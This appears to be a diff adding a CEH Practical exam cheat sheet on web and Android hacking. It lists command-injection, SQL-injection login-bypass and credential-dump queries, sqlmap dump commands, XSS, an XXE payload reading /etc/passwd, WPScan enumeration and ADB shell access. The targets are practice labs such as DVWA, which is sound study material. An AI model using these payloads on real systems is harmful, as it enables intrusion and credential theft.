@@ -205,3 +205,178 @@ Secure configuration
 ✅ Remember ADB commands
 ✅ Focus on logic, not memorization
 ✅ Understand why payload works
+
+
+
+
+🔥 CEH Practical Exam – Ultimate Cheatsheet
+
+(Web & Android Application Hacking)
+
+🧠 HOW TO USE THIS IN EXAM
+
+Read the question
+
+Identify the attack type
+
+Jump to that section
+
+Apply payload → tool → dump → flag
+
+1️⃣ COMMAND INJECTION
+🔍 Detection Payloads
+8.8.8.8
+127.0.0.1
+
+🚨 Exploitation Payloads
+8.8.8.8 | whoami
+8.8.8.8 | pwd
+8.8.8.8 && ls
+8.8.8.8 ; id
+
+
+📌 Logic: Input is executed directly by OS shell
+
+2️⃣ SQL INJECTION (MANUAL)
+🔎 Detection
+'
+"
+' OR '1'='1
+
+🔓 Login Bypass
+' OR 1=1-- 
+' OR 'a'='a'-- 
+
+🔗 UNION Column Count
+1 UNION SELECT 1
+1 UNION SELECT 1,2
+1 UNION SELECT 1,2,3
+
+
+✔️ Stop when page loads normally
+
+🗂️ Database Enumeration
+database()
+
+0 UNION SELECT 1,2,group_concat(table_name)
+FROM information_schema.tables
+WHERE table_schema='dvwa';
+
+🧱 Column Enumeration
+0 UNION SELECT 1,2,group_concat(column_name)
+FROM information_schema.columns
+WHERE table_name='users';
+
+🔑 Dump Credentials
+0 UNION SELECT 1,2,
+group_concat(user,':',password SEPARATOR '<br>')
+FROM users;
+
+3️⃣ SQLMAP (AUTOMATED – HIGH SCORE)
+🔍 Help
+sqlmap -h
+
+🌐 GET Method
+sqlmap --url http://target/page.php?id=1 --dbs
+
+📡 POST Method (Burp Suite)
+sqlmap -r req.txt --dbs
+
+📂 Tables & Columns
+sqlmap -r req.txt -D dvwa --tables
+sqlmap -r req.txt -D dvwa --columns
+
+💾 Dump Data
+sqlmap -r req.txt -D dvwa --dump
+
+
+📌 Exam Rule:
+❌ URL not working → ✔️ use -r req.txt
+
+4️⃣ XSS (QUICK MARKS)
+🧪 Payloads
+<script>alert(1)</script>
+
+<img src=x onerror=alert(1)>
+
+
+✔️ Alert popup = vulnerable
+
+5️⃣ XXE (XML EXTERNAL ENTITY)
+🔹 Basic Entity
+<!DOCTYPE test [
+<!ENTITY x "test">
+]>
+<root>&x;</root>
+
+📂 File Read Payload
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY read SYSTEM "file:///etc/passwd">
+]>
+<root>&read;</root>
+
+
+📌 Try also:
+
+file:///proc/version
+
+6️⃣ WPSCAN (WORDPRESS)
+wpscan --url http://IP
+
+wpscan --url http://IP --enumerate u
+
+
+📌 Finds:
+
+Users
+
+Plugins
+
+Vulnerabilities
+
+7️⃣ ANDROID HACKING (ADB)
+🔗 Connect
+adb connect IP:5555
+adb devices
+
+🐚 Shell Access
+adb shell
+ls
+whoami
+cd sdcard/
+find .
+cat secret.txt
+
+
+📌 Exam Pattern: flag in .txt file
+
+8️⃣ DVWA INSTALL (FAST)
+sudo apt install docker.io
+docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+
+🌐 Open:
+
+http://localhost
+
+
+Set security → LOW
+
+🎯 CEH PRACTICAL GOLDEN TIPS
+
+✔️ Enumeration > Exploitation
+✔️ Manual first, SQLMap second
+✔️ Burp for POST requests
+✔️ Flags usually plain text
+✔️ Don’t overthink payloads
+
+📘 GITHUB WIKI STRUCTURE (RECOMMENDED)
+Home
+├── Command Injection
+├── SQL Injection
+├── SQLMap
+├── XSS
+├── XXE
+├── WPScan
+├── Android (ADB)
